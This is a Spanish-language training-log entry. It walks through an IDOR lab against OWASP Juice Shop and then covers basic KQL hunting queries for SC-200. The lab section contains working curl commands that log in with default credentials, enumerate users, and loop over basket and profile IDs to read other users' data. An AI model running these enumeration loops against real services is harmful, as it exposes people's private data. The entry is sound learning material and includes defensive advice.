# Día 28 — IDOR + KQL Tablas y Operadores

**Fecha:** Mayo 2026  
**MITRE:** T1078  
**Target:** OWASP Juice Shop

---

## Teoría

### IDOR — Insecure Direct Object Reference

IDOR es una vulnerabilidad donde la app usa un identificador controlable por el usuario para acceder directamente a un objeto — sin verificar si ese usuario tiene permiso para verlo.

```
URL normal:
https://app.com/orders/1042   ← tu pedido

URL manipulada:
https://app.com/orders/1041   ← pedido de otro usuario
```

Si el servidor devuelve el pedido 1041 sin verificar que te pertenece — eso es IDOR.

**¿Por qué es peligroso?**
- Leer datos de otros usuarios — perfiles, pedidos, documentos
- Modificar o eliminar recursos ajenos
- Escalar privilegios accediendo a endpoints de admin
- Exfiltrar datos masivamente incrementando el ID en un loop

**Lo que lo hace diferente a otras vulnerabilidades:**

No requiere exploits ni payloads complejos. El "ataque" es simplemente cambiar un número en la URL o en el body del request. La vulnerabilidad está en la lógica del servidor — no en el input.

**Casos reales:**
- **Facebook (2012)** — IDOR para eliminar fotos de cualquier usuario → bug bounty $12.5K
- **Instagram (2019)** — IDOR en API de Stories para ver contenido privado
- **Parler (2021)** — IDOR en API sin autenticación + IDs secuenciales → 70TB de datos exfiltrados antes del cierre

---

## Red Team

### Sección 1 — Enumeración de usuarios

Primero se obtuvo la lista completa de usuarios para identificar los IDs disponibles:

```bash
TOKEN=$(curl -s -X POST "http://192.168.1.96:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

curl -s "http://192.168.1.96:3000/api/Users" \
  -H "Authorization: Bearer $TOKEN" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data['data']:
    print(f\"ID: {u['id']}  Email: {u['email']}  Role: {u['role']}\")
"
```

**Resultado — 21 usuarios con IDs secuenciales:**
```
ID: 1   Email: admin@juice-sh.op              Role: admin
ID: 2   Email: jim@juice-sh.op                Role: customer
ID: 3   Email: bender@juice-sh.op             Role: customer
ID: 4   Email: bjoern.kimminich@gmail.com      Role: admin
ID: 5   Email: ciso@juice-sh.op               Role: deluxe
ID: 6   Email: support@juice-sh.op            Role: admin
...
ID: 15  Email: accountant@juice-sh.op          Role: accounting
ID: 22  Email: testing@juice-sh.op             Role: admin
```

**Señales de IDOR potencial:**
- IDs numéricos secuenciales — fáciles de predecir e iterar
- El ID 14 falta — usuario eliminado, pero el patrón secuencial se mantiene
- Diversidad de roles — 6 admins, 4 deluxe, 1 accounting, resto customers

### Sección 2 — Login como usuario sin privilegios

Para probar IDOR se necesita un usuario sin privilegios. Si el admin puede ver todo, no hay vulnerabilidad — es su rol. El test real es: ¿un customer puede ver datos de otros usuarios?

```bash
TOKEN_USER=$(curl -s -X POST "http://192.168.1.96:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
```

Jim es usuario ID 2, rol customer. La password `ncc-1701` es una referencia a Star Trek (usuario documentado de Juice Shop).

### Sección 3 — IDOR en carritos de compra

Jim (ID 2) intenta acceder al carrito del admin (ID 1):

```bash
curl -s "http://192.168.1.96:3000/rest/basket/1" \
  -H "Authorization: Bearer $TOKEN_USER" | python3 -m json.tool | head -20
```

**Resultado:**
```json
{
    "status": "success",
    "data": {
        "id": 1,
        "UserId": 1,
        "Products": [
            {"name": "Apple Juice (1000ml)", "price": 1.99},
            {"name": "Orange Juice (1000ml)", "price": 2.99},
            {"name": "Eggfruit Juice (500ml)", "price": 8.99}
        ]
    }
}
```

**IDOR CONFIRMADO** ✅ — `UserId: 1` confirma que este carrito es del admin. Jim accedió sin autorización.

**Exfiltración masiva — iteración de todos los carritos:**

```bash
for i in $(seq 1 6); do
  echo "=== Basket $i ==="
  curl -s "http://192.168.1.96:3000/rest/basket/$i" \
    -H "Authorization: Bearer $TOKEN_USER" | \
    python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)['data']
    print(f\"  UserId: {data['UserId']}\")
    for p in data['Products']:
        print(f\"  - {p['name']} \${p['price']}\")
    if not data['Products']:
        print('  (vacío)')
except:
    print('  Sin acceso')
"
done
```

**Resultado:**
```
=== Basket 1 ===
  UserId: 1
  - Apple Juice (1000ml) $1.99
  - Orange Juice (1000ml) $2.99
  - Eggfruit Juice (500ml) $8.99
=== Basket 2 ===
  UserId: 2
  - Raspberry Juice (1000ml) $4.99
=== Basket 3 ===
  UserId: 3
  - Raspberry Juice (1000ml) $4.99
=== Basket 4 ===
  UserId: 11
  - Raspberry Juice (1000ml) $4.99
=== Basket 5 ===
  UserId: 16
  - Eggfruit Juice (500ml) $8.99
  - Raspberry Juice (1000ml) $4.99
=== Basket 6 ===
  Sin acceso
```

Jim accedió a los carritos de 5 usuarios diferentes. Un atacante real vería patrones de consumo, precios y la estructura interna de la base de datos.

### Sección 4 — IDOR en perfiles de usuario

```bash
curl -s "http://192.168.1.96:3000/api/Users/1" \
  -H "Authorization: Bearer $TOKEN_USER" | python3 -m json.tool
```

**Resultado:**
```json
{
    "status": "success",
    "data": {
        "id": 1,
        "username": "",
        "email": "admin@juice-sh.op",
        "role": "admin",
        "profileImage": "assets/public/images/uploads/defaultAdmin.png",
        "isActive": true,
        "createdAt": "2026-05-03T13:06:43.920Z",
        "updatedAt": "2026-05-03T13:06:43.920Z"
    }
}
```

**Segundo IDOR confirmado** ✅ — Jim accede al perfil completo del admin: email, rol, estado de cuenta y fechas. El campo `password` no aparece — Juice Shop al menos filtra eso. En apps peor programadas aparecería el hash del password.

**Resumen de los dos IDOR encontrados:**

| Endpoint | Qué expone | Impacto |
|----------|-----------|---------|
| `/rest/basket/{id}` | Carrito de cualquier usuario | Datos comerciales, patrones de compra |
| `/api/Users/{id}` | Perfil de cualquier usuario | Email, rol, estado de cuenta |

**Lo que hizo posible ambos ataques:**
```
1. IDs secuenciales predecibles (1, 2, 3...)
2. El servidor no valida: ¿este JWT pertenece al userId solicitado?
3. Cualquier token válido sirve para acceder a cualquier recurso
```

---

## SC-200 — KQL: Tablas y Operadores

### Advanced Hunting en Microsoft Defender XDR

El Advanced Hunting es el editor de KQL integrado en el portal `security.microsoft.com`. Permite a un SOC Analyst escribir queries para buscar proactivamente amenazas que las alertas automáticas no detectaron.

### Anatomía de KQL

KQL funciona con pipes, igual que bash:

```kql
Tabla
| operador1
| operador2
| operador3
```

Cada pipe toma el resultado del paso anterior y le aplica una transformación.

### Query 1 — Leer alertas básicas

```kql
AlertInfo
| take 10
```

`take 10` limita a 10 resultados — equivalente al `LIMIT` de SQL. Se usa para explorar una tabla sin cargar todos los datos.

### Query 2 — Filtrar alertas por severidad

```kql
AlertInfo
| where Severity in ("Medium", "High")
| project Timestamp, Title, Severity, Category
| sort by Timestamp desc
```

**Resultado — 6 alertas Medium/High:**
```
29 abr  Unusual number of failed sign-in    Medium  CredentialAccess
27 abr  Unusual number of failed sign-in    Medium  CredentialAccess
27 abr  Remote exfiltration activity         Medium  Exfiltration
27 abr  Suspicious shell command             Medium  Execution
27 abr  Suspicious archive creation          High    Collection
27 abr  Enumeration of files with s...       Medium  Collection
```

La cronología revela una cadena de ataque: enumeración de archivos → compresión sospechosa → shell command → exfiltración. Un atacante recolectó datos y los sacó del sistema.

### Query 3 — Conteo de alertas por categoría MITRE

```kql
AlertInfo
| summarize Count = count() by Category
| sort by Count desc
```

**Resultado — mapa de amenazas del tenant:**
```
Execution            10
Malware               9
CredentialAccess      2
Collection            2
Discovery             1
CommandAndControl     1
Exfiltration          1
PrivilegeEscalation   1
DefenseEvasion        1
```

`summarize count() by` agrupa y cuenta — equivalente al `GROUP BY + COUNT` de SQL. En un SOC real esta query sirve para priorizar: ¿qué tipo de amenaza es la más frecuente?

### Operadores KQL aprendidos

| Operador | Equivalente SQL | Qué hace |
|----------|----------------|----------|
| `take` | `LIMIT` | Limita número de filas |
| `where` | `WHERE` | Filtra filas por condición |
| `project` | `SELECT col1, col2` | Selecciona columnas específicas |
| `sort by` | `ORDER BY` | Ordena resultados |
| `summarize count() by` | `GROUP BY + COUNT` | Agrupa y cuenta |

Estos 5 operadores cubren aproximadamente el 70% de las queries que aparecen en el examen SC-200.

---

## Blue Team

### Detección IDOR
- **WAF con rate limiting** — un atacante iterando IDs genera muchas requests secuenciales al mismo endpoint
- **Logging de acceso** — registrar quién accede a qué recurso y comparar con ownership
- **Anomaly detection** — un usuario que accede a 100 carritos en 1 minuto es sospechoso
- **Monitoreo de parámetros** — alertar cuando un usuario accede a recursos con IDs que no le pertenecen

### Mitigación IDOR
- **Autorización server-side** — cada request debe verificar que el JWT pertenece al recurso solicitado
- **UUIDs en lugar de IDs secuenciales** — `550e8400-e29b-41d4-a716-446655440000` no es predecible como `1, 2, 3`
- **Indirect references** — mapear IDs internos a tokens de sesión: el servidor traduce `/basket/mi-carrito` al ID real internamente
- **Control de acceso por recurso** — no basta con verificar que el token es válido, hay que verificar que el token tiene permiso sobre ese recurso específico

---

## Conclusión

IDOR demostró que la vulnerabilidad más simple puede ser la más peligrosa. Sin exploits ni payloads — solo cambiando un número en la URL — Jim accedió a carritos y perfiles de todos los usuarios del sistema. La raíz del problema es que Juice Shop valida autenticación (¿eres un usuario válido?) pero no autorización (¿tienes permiso para ver ESTE recurso?). Esta distinción entre autenticación y autorización es fundamental tanto para pentesting como para el SC-200.

En la sección de KQL se ejecutaron las primeras 3 queries en el Advanced Hunting de Defender XDR con datos reales del tenant. Los 5 operadores aprendidos — `take`, `where`, `project`, `sort by` y `summarize` — forman la base del threat hunting con KQL. La query de conteo por categoría MITRE reveló que Execution y Malware son las tácticas dominantes en el tenant, seguidas de CredentialAccess y Collection.
